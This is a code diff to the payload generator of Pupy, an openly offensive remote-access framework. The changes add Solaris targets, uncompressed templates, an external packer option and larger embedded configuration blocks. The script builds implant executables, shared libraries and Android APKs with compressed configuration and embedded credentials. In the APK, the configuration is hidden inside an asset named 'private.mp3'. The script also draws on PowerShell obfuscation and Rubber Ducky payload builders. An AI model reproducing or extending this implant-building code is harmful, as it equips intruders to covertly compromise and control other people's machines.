@@ -1,4 +1,4 @@
-#!/usr/bin/python -O
+#!/usr/bin/env python -O
 # -*- coding: utf-8 -*-
 # Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
 # Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms
@@ -6,7 +6,7 @@
 import logging, argparse, sys, os.path, re, shlex, random, string, zipfile, tarfile, tempfile, shutil, subprocess, traceback, pkgutil
 from pupylib.utils.network import get_listener_ip, get_listener_port
 from pupylib.utils.term import colorize
-from pupylib.payloads.python_packer import gen_package_pickled_dic
+from pupylib.payloads import dependencies
 from pupylib.payloads.py_oneliner import serve_payload, pack_py_payload, getLinuxImportedModules
 from pupylib.payloads.rubber_ducky import rubber_ducky
 from pupylib.utils.obfuscate import compress_encode_obfs
@@ -14,7 +14,7 @@ from pupylib.PupyConfig import PupyConfig
 from network.conf import transports, launchers
 from network.lib.base_launcher import LauncherError
 from scriptlets.scriptlets import ScriptletArgumentError
-from modules.lib.windows.powershell_upload import obfuscatePowershellScript
+from modules.lib.windows.powershell import obfuscatePowershellScript
 from pupylib.PupyCredentials import Credentials, EncryptionError
 from pupylib import PupyCredentials
 from pupylib.PupyVersion import __version__
@@ -30,7 +30,7 @@ import getpass
 import json
 
 ROOT=os.path.abspath(os.path.join(os.path.dirname(__file__)))
-HARDCODED_CONF_SIZE=32768
+HARDCODED_CONF_SIZE=65536
 
 def check_templates_version():
     try:
@@ -42,7 +42,7 @@ def check_templates_version():
         logging.warning("Your templates are not synced with your pupy version ! , you should update them with \"git submodule update\"")
 
 
-def get_edit_binary(path, conf):
+def get_edit_binary(path, conf, compressed_config=True):
     logging.debug("generating binary %s with conf: %s"%(path, conf))
     binary=b""
     with open(path, 'rb') as f:
@@ -60,13 +60,13 @@ def get_edit_binary(path, conf):
     elif len(offsets) > 1:
         raise Exception("Error: multiple offsets to edit the config have been found")
 
-    new_conf = marshal.dumps(compile(get_raw_conf(conf), '<string>', 'exec'))
+    new_conf = marshal.dumps(compile(get_raw_conf(conf), '<config>', 'exec'))
     uncompressed = len(new_conf)
-    new_conf = pylzma.compress(new_conf)
+    if compressed_config:
+        new_conf = pylzma.compress(new_conf)
     compressed = len(new_conf)
     new_conf = struct.pack('>II', compressed, uncompressed) + new_conf
     new_conf_len = len(new_conf)
-
 
     if new_conf_len > HARDCODED_CONF_SIZE:
         raise Exception(
@@ -75,6 +75,8 @@ def get_edit_binary(path, conf):
         )
 
     new_conf = new_conf + os.urandom(HARDCODED_CONF_SIZE-new_conf_len)
+
+    logging.debug('Free space: {}'.format(HARDCODED_CONF_SIZE-new_conf_len))
 
     offset = offsets[0]
     binary = binary[0:offset]+new_conf+binary[offset+HARDCODED_CONF_SIZE:]
@@ -125,6 +127,9 @@ def get_raw_conf(conf, obfuscate=False, verbose=False):
 
     if verbose:
         for k, v in conf.iteritems():
+            if k in ('offline_script'):
+                continue
+
             print colorize("[C] {}: {}".format(k, v), "yellow")
 
     config = '\n'.join([
@@ -132,12 +137,9 @@ def get_raw_conf(conf, obfuscate=False, verbose=False):
             repr(cPickle.dumps({
                 'pupy_credentials.py' : embedded_credentials
             }))),
-        '\n'.join([
-            'pupyimporter.pupy_add_package({})'.format(
-                repr(cPickle.dumps(gen_package_pickled_dic(
-                    ROOT+os.sep, 'network.transports.{}'.format(transport)
-                    )))) for transport in transports_list
-        ]),
+        dependencies.importer(set(
+            'network.transports.{}'.format(transport) for transport in transports_list
+        ), path=ROOT),
         'import sys',
         'sys.modules.pop("network.conf")',
         'import network.conf',
@@ -193,7 +195,7 @@ def updateTar(arcpath, arcname, file_path):
     finally:
         shutil.rmtree(tempdir)
 
-def get_edit_apk(path, conf):
+def get_edit_apk(path, conf, compressed_config=None):
     tempdir = tempfile.mkdtemp(prefix="tmp_pupy_")
     fd, tempapk = tempfile.mkstemp(prefix="tmp_pupy_")
     try:
@@ -212,7 +214,7 @@ def get_edit_apk(path, conf):
 
         print "[+] packaging the apk ... (can take 10-20 seconds)"
         #updating the tar with the new config
-        updateTar(os.path.join(tempdir,"assets/private.mp3"), "service/pp.pyo", os.path.join(tempdir,"pp.pyo"))
+        updateTar(os.path.join(tempdir,"assets/private.mp3"), "pp.pyo", os.path.join(tempdir,"pp.pyo"))
         #repacking the tar in the apk
         with open(os.path.join(tempdir,"assets/private.mp3"), 'r') as t:
             updateZip(tempapk, "assets/private.mp3", t.read())
@@ -235,8 +237,8 @@ def get_edit_apk(path, conf):
         shutil.rmtree(tempdir, ignore_errors=True)
         os.unlink(tempapk)
 
-def generate_binary_from_template(config, osname, arch=None, shared=False, debug=False, bits=None, fmt=None):
-    TEMPLATE_FMT = fmt or 'pupy{arch}{debug}.{ext}'
+def generate_binary_from_template(config, osname, arch=None, shared=False, debug=False, bits=None, fmt=None, compressed=True):
+    TEMPLATE_FMT = fmt or 'pupy{arch}{debug}{unk}.{ext}'
     ARCH_CONVERT = {
         'amd64': 'x64', 'x86_64': 'x64',
         'i386': 'x86', 'i486': 'x86', 'i586': 'x86', 'i686': 'x86',
@@ -262,7 +264,14 @@ def generate_binary_from_template(config, osname, arch=None, shared=False, debug
     CLIENTS = {
         'android': (get_edit_apk, 'pupy.apk', False),
         'linux': (get_edit_binary, TEMPLATE_FMT, True),
+        'solaris': (get_edit_binary, TEMPLATE_FMT, True),
         'windows': (get_edit_binary, TEMPLATE_FMT, False),
+    }
+
+    SUFFIXES = {
+        'windows': ( 'exe', 'dll' ),
+        'linux':   ( 'lin', 'lin.so' ),
+        'solaris': ( 'sun', 'sun.so' ),
     }
 
     osname = osname.lower()
@@ -276,26 +285,40 @@ def generate_binary_from_template(config, osname, arch=None, shared=False, debug
     if '{arch}' in template and not arch:
         raise ValueError('arch required for the target OS ({})'.format(osname))
 
-    shared_ext = 'dll' if osname == 'windows' else 'so'
-    non_shared_ext = 'exe' if osname == 'windows' else 'lin'
-    ext = shared_ext if shared else non_shared_ext
+    shared_ext = 'xxx'
+    non_shared_ext = 'xxx'
+
+    if osname in SUFFIXES:
+        non_shared_ext, shared_ext = SUFFIXES[osname]
+
     debug = 'd' if debug else ''
 
     if shared:
         makex = False
+        ext = shared_ext
+    else:
+        ext = non_shared_ext
 
-    filename = template.format(arch=arch, debug=debug, ext=ext)
+    filename = template.format(arch=arch, debug=debug, ext=ext, unk='.unc' if not compressed else '')
     template = os.path.join(
-        ROOT, 'payload_templates', filename
+        'payload_templates', filename
     )
+
+    if not os.path.isfile(template):
+        template = os.path.join(
+            ROOT, 'payload_templates', filename
+        )
 
     if not os.path.isfile(template):
         raise ValueError('Template not found ({})'.format(template))
 
     for k, v in config.iteritems():
+        if k in ('offline_script'):
+            continue
+
         print colorize("[C] {}: {}".format(k, v), "yellow")
 
-    return generator(template, config), filename, makex
+    return generator(template, config, compressed), filename, makex
 
 def load_scriptlets():
     scl={}
@@ -311,9 +334,9 @@ def load_scriptlets():
                         scl[module_name]=module2.ScriptletGenerator
     return scl
 
-def parse_scriptlets(args_scriptlet, debug=False):
-    scriptlets_dic=load_scriptlets()
-    sp=scriptlets.scriptlets.ScriptletsPacker(debug=debug)
+def parse_scriptlets(args_scriptlet, os=None, arch=None, debug=False):
+    scriptlets_dic = load_scriptlets()
+    sp = scriptlets.scriptlets.ScriptletsPacker(os, arch, debug=debug)
     for sc in args_scriptlet:
         tab=sc.split(",",1)
         sc_args={}
@@ -377,7 +400,7 @@ PAYLOAD_FORMATS = [
     'client', 'py', 'pyinst', 'py_oneliner', 'ps1', 'ps1_oneliner', 'rubber_ducky'
 ]
 
-CLIENT_OS = [ 'android', 'windows', 'linux' ]
+CLIENT_OS = [ 'android', 'windows', 'linux', 'solaris' ]
 CLIENT_ARCH = [ 'x86', 'x64' ]
 
 def get_parser(base_parser, config):
@@ -388,6 +411,9 @@ def get_parser(base_parser, config):
                             choices=CLIENT_OS, help='Target OS (default: windows)')
     parser.add_argument('-A', '--arch', default=config.get('gen', 'arch'),
                             choices=CLIENT_ARCH, help='Target arch (default: x86)')
+    parser.add_argument('-U', '--uncompressed', default=False, action='store_true',
+                            help='Use uncompressed template')
+    parser.add_argument('-P', '--packer', default=config.get('gen', 'packer'), help='Use packer')
     parser.add_argument('-S', '--shared', default=False, action='store_true', help='Create shared object')
     parser.add_argument('-o', '--output', help="output path")
     parser.add_argument('-D', '--output-dir', default=config.get('gen', 'output'), help="output folder")
@@ -421,7 +447,12 @@ def pupygen(args, config):
 
     script_code=""
     if args.scriptlet:
-        script_code=parse_scriptlets(args.scriptlet, debug=args.debug_scriptlets)
+        script_code=parse_scriptlets(
+            args.scriptlet,
+            os=args.os,
+            arch=args.arch,
+            debug=args.debug_scriptlets
+        )
 
 
     l = launchers[args.launcher]()
@@ -472,7 +503,8 @@ def pupygen(args, config):
 
         data, filename, makex = generate_binary_from_template(
             conf, args.os,
-            arch=args.arch, shared=args.shared, debug=args.debug
+            arch=args.arch, shared=args.shared, debug=args.debug,
+            compressed=not ( args.uncompressed or args.packer )
         )
 
         if not outpath:
@@ -495,7 +527,13 @@ def pupygen(args, config):
         outfile.close()
 
         if makex:
-            os.chmod(outfile.name, 0511)
+            os.chmod(outfile.name, 0711)
+
+        if args.packer:
+            subprocess.check_call(
+                args.packer.replace('%s', outfile.name),
+                shell=True
+            )
 
         outpath = outfile.name
 
